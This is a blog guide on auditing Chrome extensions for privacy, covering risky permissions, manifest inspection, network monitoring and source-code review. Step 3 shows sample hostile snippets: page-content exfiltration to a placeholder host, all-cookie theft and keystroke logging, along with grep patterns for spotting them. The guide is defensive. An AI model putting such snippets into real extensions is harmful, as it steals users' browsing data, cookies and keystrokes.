---
layout: default
title: "How to Audit Chrome Extensions for Privacy"
description: "Step-by-step guide to reviewing Chrome extension permissions, network requests, and source code to identify extensions that spy on your browsing activity"
date: 2026-03-21
author: theluckystrike
permalink: /audit-chrome-extensions-privacy-guide/
categories: [guides]
reviewed: true
score: 8
intent-checked: true
voice-checked: true
tags: [privacy-tools-guide, privacy]
---

{% raw %}

Chrome extensions are one of the most dangerous vectors for browser privacy violations. Extensions run inside your browser with access to every page you visit, every form you fill, and in many cases your clipboard and cookies. Poorly reviewed extensions — including ones with millions of users and high ratings — have been caught stealing passwords, injecting ads, exfiltrating browsing history, and silently installing additional malware.

This guide gives you the tools and process to evaluate extensions before installing them and audit ones already installed.

## Understanding Chrome Extension Permissions

Extensions declare what they need access to in their manifest file. When you install from the Chrome Web Store, you see a simplified version of these permissions. The full picture is more nuanced.

### The most dangerous permissions

**`<all_urls>` or "Read and change all your data on all websites"** — This is the most powerful permission. The extension can read the full content of every page you visit, including logged-in sessions, form values, and passwords as you type them.

**`tabs`** — Access to URLs of all open tabs, tab titles, and navigation events. Used to build a complete browsing history.

**`webRequest` and `webRequestBlocking`** — Can intercept, modify, and block any network request your browser makes. Legitimate for ad blockers; also used by malicious extensions to redirect traffic.

**`cookies`** — Read and write all cookies for any domain. Can steal session tokens from any site you're logged into.

**`history`** — Full access to your Chrome browsing history.

**`clipboardRead` / `clipboardWrite`** — Access to clipboard contents. Can steal passwords, crypto addresses, or other sensitive data you copy.

**`nativeMessaging`** — Can communicate with applications installed on your computer. Very rarely needed legitimately.

## Step 1: Audit Installed Extensions

Open `chrome://extensions` and enable "Developer mode" (top right toggle). This shows extension IDs and enables additional inspection options.

For each extension, click "Details" and review:
- **Permissions**: Listed explicitly
- **Site access**: "On all sites" is the most dangerous; "On specific sites" or "On click" is safer
- **Version and last updated**: Abandoned extensions are higher risk

```
chrome://extensions/  →  Developer mode ON
```

For a full list of permissions in machine-readable form, open the extension's `manifest.json`:

```bash
# Find Chrome extension directories on macOS
ls ~/Library/Application\ Support/Google/Chrome/Default/Extensions/

# Find a specific extension by ID and read its manifest
cat ~/Library/Application\ Support/Google/Chrome/Default/Extensions/EXTENSION_ID/VERSION/manifest.json | python3 -m json.tool
```

On Linux:
```bash
ls ~/.config/google-chrome/Default/Extensions/
cat ~/.config/google-chrome/Default/Extensions/EXTENSION_ID/VERSION/manifest.json
```

## Step 2: Monitor Network Requests from Extensions

Extensions can exfiltrate data to external servers at any time. Use Chrome's built-in network inspector to watch what they send:

1. Open DevTools: `Ctrl+Shift+I` (or Cmd+Option+I on Mac)
2. Go to the **Network** tab
3. Filter by selecting "Other" in the filter bar to see background requests
4. Right-click the extension icon → "Inspect popup" for popup-specific traffic
5. For background service workers: `chrome://extensions` → click "Service Worker" link under the extension

Look for:
- Requests to domains you don't recognize
- POST requests with large payloads
- Requests that fire immediately after page loads (telemetry on every page view)

To inspect extension background page traffic more systematically:

```bash
# Start Chrome with remote debugging enabled
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-debug
```

Then open `http://localhost:9222` to access the remote debugging interface, which shows all active pages and extensions as inspectable targets.

## Step 3: Read the Source Code

Extensions installed from the Chrome Web Store are stored locally as ZIP files (with a `.crx` extension under the hood). You can read all the JavaScript:

```bash
# Navigate to extension directory
cd ~/Library/Application\ Support/Google/Chrome/Default/Extensions/EXTENSION_ID/VERSION/

# List all files
find . -name "*.js" | sort

# Search for suspicious patterns
grep -r "XMLHttpRequest\|fetch\|sendMessage\|chrome.tabs.query" . --include="*.js" | head -50
grep -r "document.cookie\|localStorage\|sessionStorage" . --include="*.js" | head -30
grep -r "clipboard\|execCommand" . --include="*.js" | head -20
```

Specific patterns to look for in extension code:

**Data exfiltration:**
```javascript
// Suspicious: collecting and sending full page content
fetch('https://analytics.somesite.com/collect', {
  method: 'POST',
  body: JSON.stringify({ url: location.href, content: document.body.innerHTML })
});
```

**Cookie theft:**
```javascript
chrome.cookies.getAll({}, function(cookies) {
  // Legitimate extension would filter to specific domain
  // Suspicious: sending ALL cookies to external server
  sendToServer(cookies);
});
```

**Keystroke logging:**
```javascript
document.addEventListener('keydown', function(e) {
  // Any keylogging behavior on all pages is a red flag
  buffer.push(e.key);
});
```

## Step 4: Evaluate the Extension's Provenance

Beyond the code itself, evaluate the broader trust signals:

**Check the developer identity:**
- Is there a company or individual named? Can you verify them?
- Extensions from anonymous publishers are higher risk
- Check the Chrome Web Store listing for a developer website

**Review the privacy policy:**
- A missing privacy policy for an extension with `<all_urls>` access is a red flag
- Look for clauses about selling data to third parties

**Check for news about the extension:**
```
Search: "extension name" site:arstechnica.com OR site:bleepingcomputer.com OR site:krebsonsecurity.com
```

Many malicious extensions are eventually reported by security researchers.

**Track the user count and update history:**
- Sudden drops in ratings often indicate a recent bad update
- Extensions that haven't been updated in 2+ years may have known vulnerabilities
- Very new extensions with many installs may be using fake reviews

## Step 5: Use CRXcavator or Similar Tools

CRXcavator (crxcavator.io) automatically analyzes Chrome extensions and scores them on risk factors including permissions, content security policy, dependencies, and web store metadata. Enter the extension ID to get a report.

For command-line analysis:

```bash
# Install crx-unpack
npm install -g crx

# Download and unpack an extension by ID
crx get EXTENSION_ID
unzip EXTENSION_ID.crx -d extension_dir
cd extension_dir && grep -r "sendBeacon\|XMLHttpRequest\|fetch" . --include="*.js"
```

## Minimum Viable Extension List

The safest approach is to minimize installed extensions:

| Purpose | Recommended extension | Reason |
|---------|----------------------|--------|
| Ad/tracker blocking | uBlock Origin | Open source, audited, no telemetry |
| Password manager | Bitwarden | Open source, limited permissions |
| HTTPS enforcement | Handled by browsers natively now | Not needed in 2026 |
| Privacy Badger | EFF Privacy Badger | Reputable org, open source |

For every other extension, ask: can I accomplish this without an extension? A browser extension with `<all_urls>` access is a keylogger that you're choosing to install.

## Related Reading

- [Privacy Implications of Browser Extensions](/privacy-implications-browser-extensions/)
- [Privacy-Focused Web Browser Comparison 2026](/privacy-browser-comparison-2026/)
- [Firefox Privacy Add-ons Essential List 2026](/firefox-privacy-add-ons-essential-list-2026/)
- [AI Tools for Automating Cloud Security Compliance Scanning](https://theluckystrike.github.io/ai-tools-compared/ai-tools-for-automating-cloud-security-compliance-scanning-i/)
- [Claude vs ChatGPT for Drafting Gdpr Compliant Privacy](https://theluckystrike.github.io/ai-tools-compared/claude-vs-chatgpt-for-drafting-gdpr-compliant-privacy-polici/)

Built by theluckystrike — More at [zovo.one](https://zovo.one)

{% endraw %}
